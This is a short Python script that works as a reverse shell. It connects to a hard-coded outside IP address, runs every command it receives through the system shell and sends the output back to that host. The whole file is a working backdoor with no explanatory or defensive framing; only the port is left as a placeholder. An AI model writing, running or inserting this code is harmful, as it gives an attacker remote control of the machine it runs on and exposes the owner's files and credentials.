import socket, subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("49.50.117.2", PORT))

while True:
    cmd = s.recv(1024).decode()
    if cmd == "exit":
        break
    else:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = process.communicate()

        # Send the output back to the server.
        s.send(output + error)
